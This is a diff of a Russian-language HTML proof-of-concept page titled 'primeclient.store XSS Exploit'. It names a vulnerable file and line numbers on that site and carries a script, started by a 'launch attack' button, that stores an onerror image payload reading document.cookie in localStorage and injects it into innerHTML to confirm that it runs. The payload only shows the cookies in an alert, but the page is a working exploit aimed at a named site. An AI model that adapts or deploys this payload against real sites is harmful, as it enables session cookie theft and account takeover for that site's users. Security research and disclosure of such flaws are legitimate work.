@@ -1,41 +1,98 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>primeclient.store XSS Demo</title>
+    <title>primeclient.store XSS Exploit</title>
     <style>
         body { font-family: Arial, sans-serif; background: #1a1a2e; color: #fff; text-align: center; padding: 50px; }
         .btn { background: #e94560; border: none; padding: 15px 30px; color: #fff; font-size: 18px; cursor: pointer; border-radius: 5px; }
         .btn:hover { background: #ff6b6b; }
         .container { max-width: 600px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 10px; }
-        .code { background: #0f3460; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 14px; text-align: left; }
+        .code { background: #0f3460; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 14px; text-align: left; overflow-x: auto; }
+        .result { background: #0f3460; padding: 20px; border-radius: 5px; margin-top: 20px; min-height: 100px; }
+        .success { color: #4ade80; }
+        .error { color: #f87171; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🔴 primeclient.store — XSS Exploit</h1>
         <p>Данный скрипт демонстрирует уязвимость <strong>Stored XSS</strong> на сайте primeclient.store.</p>
-        <p>При нажатии на кнопку будет выполнен код, который крадёт куки пользователя.</p>
         
         <button class="btn" onclick="exploit()">🚀 Запустить атаку</button>
         
-        <h3>📋 Что произойдёт:</h3>
+        <div id="result" class="result">
+            <span style="color: #888;">Результат появится здесь...</span>
+        </div>
+        
+        <h3>📋 Технические детали:</h3>
         <div class="code">
-            1. Ваш браузер изменит значение prime_lang в localStorage<br>
-            2. Страница перезагрузится<br>
-            3. Появится всплывающее окно с вашими куками
+            Уязвимость: Stored XSS через localStorage<br>
+            Файл: app.js<br>
+            Строки: 609, 1200, 1216, 1271, 1287<br>
+            Тип: Вставка данных из localStorage в innerHTML без санитизации
         </div>
         
         <p style="margin-top: 20px; font-size: 12px; color: #888;">
-            Уязвимость найдена в файле app.js (строки 609, 1200, 1216, 1271, 1287)
+            После нажатия на кнопку в localStorage будет записан вредоносный код,<br>
+            и на этой же странице будет создан элемент, который его выполнит.
         </p>
     </div>
     
     <script>
         function exploit() {
-            // Внедряем вредоносный код в localStorage
-            localStorage.setItem('prime_lang', '<img src=x onerror="alert(document.cookie)">');
-            // Перезагружаем страницу, чтобы код выполнился
-            location.reload();
+            const result = document.getElementById('result');
+            
+            // 1. Создаём вредоносный пейлоад
+            const payload = '<img src=x onerror="alert(\'🔥 XSS Успешно! Ваши куки: \' + document.cookie)">';
+            
+            // 2. Сохраняем в localStorage
+            localStorage.setItem('prime_lang', payload);
+            result.innerHTML = '<span class="success">✅ Вредоносный код записан в localStorage (prime_lang)</span><br>';
+            
+            // 3. Создаём элемент на странице, который использует этот язык
+            // Эмулируем работу сайта: создаём элемент с классом, который использует langDict
+            const testContainer = document.createElement('div');
+            testContainer.id = 'xss-test-container';
+            testContainer.style.cssText = 'margin-top: 20px; padding: 15px; background: #0f3460; border-radius: 5px;';
+            
+            // Создаём элемент, который должен отобразить язык (как на сайте)
+            const heroTitle = document.createElement('h2');
+            heroTitle.id = 'hero-title-test';
+            
+            // Имитируем логику сайта: берём значение из localStorage
+            const lang = localStorage.getItem('prime_lang') || 'ru';
+            
+            // Вставляем язык в innerHTML (уязвимое место)
+            // Именно так это работает на сайте (строка 609)
+            heroTitle.innerHTML = lang;
+            
+            testContainer.appendChild(heroTitle);
+            document.querySelector('.container').appendChild(testContainer);
+            
+            // 4. Дополнительно: проверяем, что payload сработал
+            result.innerHTML += '<span class="success">✅ Создан тестовый элемент с использованием prime_lang</span><br>';
+            result.innerHTML += '<span class="success">🔥 Если вы видите всплывающее окно — XSS сработал!</span><br>';
+            
+            // 5. Если alert не сработал, показываем альтернативное подтверждение
+            setTimeout(() => {
+                // Проверяем, что payload всё ещё в localStorage
+                const check = localStorage.getItem('prime_lang');
+                if (check === payload) {
+                    result.innerHTML += '<span class="success">✅ payload всё ещё в localStorage</span><br>';
+                } else {
+                    result.innerHTML += '<span class="error">❌ payload был изменён или удалён</span><br>';
+                }
+                
+                // Показываем содержимое элемента, чтобы убедиться
+                const el = document.getElementById('hero-title-test');
+                if (el) {
+                    result.innerHTML += `<span class="success">📄 Текущее содержимое: ${el.innerHTML}</span><br>`;
+                    // Если внутри есть <img> — значит уязвимость активна
+                    if (el.innerHTML.includes('<img')) {
+                        result.innerHTML += '<span class="success" style="color: #fbbf24;">🔥 УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА!</span><br>';
+                    }
+                }
+            }, 1000);
         }
     </script>
 </body>
